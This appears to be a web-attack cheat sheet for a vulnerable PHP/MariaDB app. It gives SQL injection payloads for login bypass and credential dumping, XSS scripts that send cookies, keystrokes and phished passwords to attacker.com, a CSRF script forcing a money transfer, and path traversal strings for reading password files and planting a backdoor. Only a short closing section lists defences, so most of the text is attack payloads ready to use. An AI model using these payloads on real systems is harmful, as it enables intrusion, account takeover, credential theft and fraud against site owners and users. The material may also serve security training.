
## 1. SQL INJECTION VECTORS (MariaDB Compatible)

---

### a) **Login Bypass**

**Payload Example 1**

- **Email**: `admin@example.com' OR 1=1 --`
    
- **Password**: anything
    

**Injected Query**:

```sql
SELECT * FROM users WHERE email='' OR 1=1 -- ' AND pass='anything'
```

---
**MariaDB-Specific Variant**

- **Email**: `admin@example.com' #`
    
- **Password**: anything
    

**Injected Query**:

```sql
SELECT * FROM users WHERE email='admin' # ' AND pass='anything'
```

Note: `#` is a valid comment character in MariaDB (like `--` ), and it ignores the rest of the line.

---

### b) **UNION-Based Attack**

**Payload**:

- **Search**: `' UNION SELECT 1, CONCAT(email, ':', pass), 3 FROM users -- `
    

**Injected Query**:

```sql
SELECT id, name, info FROM products WHERE name='' UNION SELECT 1, CONCAT(email, ':', pass), 3 FROM users -- '
```

This would display all users’ credentials in the search results (if column counts and types match).

---

### c) **Blind SQL Injection**

**Payload**:

- **Email**: `admin@example.com' AND (SELECT SUBSTRING(pass,1,1) FROM users WHERE id=1)='a`
    

**Injected Query**:

```sql
SELECT * FROM users 
WHERE email='admin@example.com' AND (SELECT SUBSTRING(pass,1,1) FROM users WHERE id=1)='a'
```

This doesn't reveal errors or results directly, but with repeated guessing, the attacker can infer the password one character at a time.

---

### d) **Time-Based Blind Injection**

**Payload**:

- **Search**: `%' OR IF(1=1,SLEEP(5),0) -- `
    

**Injected Query**:

```sql
SELECT * FROM products WHERE name='%' OR IF(1=1, SLEEP(5), 0) -- '
```

If the server delays 5 seconds, it confirms a successful injection.

---
## 2. XSS Payload Examples

### a) **Cookie Stealer**

```html
<script>
  var i = new Image();
  i.src = "https://attacker.com/log.php?c=" + document.cookie;
</script>
```

---

### b) **Keylogger**

```html
<script>
  document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/log.php?key=' + e.key);
  });
</script>
```

---

### c) **Phishing Form Overlay**

```html
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:999">
  <h2>Session Expired</h2>
  <form action="https://attacker.com/steal.php">
    Email: <input name="email"><br>
    Password: <input type="password" name="password"><br>
    <button>Login Again</button>
  </form>
</div>
```

---
## 3. CSRF Attack Vectors

### a) Hidden Form Method

Create an invisible form that automatically submits, transferring money to the attacker's account.

---

### b) JavaScript `fetch()` Method (IMG Tag Alternative)

This uses `fetch()` to simulate a form submission directly in JavaScript:

```html
<script>
fetch("http://your-target.com/dashboard.php", {
  method: "POST",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded",
  },
  body: "to_id=7&amount=10000000&transfer=Transfer+Money"
});
</script>
```

> **Note:** While `fetch()` doesn't work cross-origin by default (due to CORS), it's still useful for same-origin CSRF or if the target lacks proper protections.

---
## 4. Path Traversal Exploitation

### a) Reading Sensitive Files

Use directory traversal sequences to access files outside the intended path:

```
?path=../../../xampp/passwords.txt
```

This can expose sensitive configuration files, credentials, or other private data if the server doesn’t sanitize the `path` input.

---

### b) Writing to Executable Locations

Abuse file writing features to drop malicious files into web-accessible directories:

```
?backup=1&path=../../../xampp/htdocs/backdoor/
```

This could allow an attacker to:

- Deploy a **web shell** or **backdoor**
    
- Leak sensitive backups
    
- Escalate the attack by executing arbitrary PHP/JS code
    

> ⚠️ Always validate and sanitize file paths on the server side, and never allow user input to define write locations without strict control.

---

## 5. Prevention Techniques

>  For educational purposes — here’s how to fix or mitigate the common vulnerabilities:

---

### a) **SQL Injection**

-  Use **prepared statements** with **parameterized queries**
    
-  Apply strict **input validation** (whitelisting where possible)
    
-  Follow the **principle of least privilege** (minimal DB rights)
    

---

### b) **Cross-Site Scripting (XSS)**

-  **Sanitize input/output** using context-aware escaping
    
-  Implement **Content Security Policy (CSP)**
    
-  Use `HttpOnly` and `Secure` flags for cookies
    

---

### c) **Cross-Site Request Forgery (CSRF)**

-  Add **anti-CSRF tokens** in forms and validate them server-side
    
-  Use `SameSite` attribute for cookies (`SameSite=Strict` or `Lax`)
    
-  Validate the **Referer** or **Origin** header for critical actions
    

---

### d) **Path Traversal**

-  **Validate and sanitize** all user-controlled file paths
    
-  Use **server-side path whitelisting** or mapping
    
-  Enforce **access control** checks for file operations
    

---

### e) **Authentication & Session Management**

-  Implement proper **session validation** and timeouts
    
-  Use strong **password hashing** (e.g., bcrypt, Argon2) with salting
    
-  Apply **account lockout** or throttling to prevent brute-force attacks
    
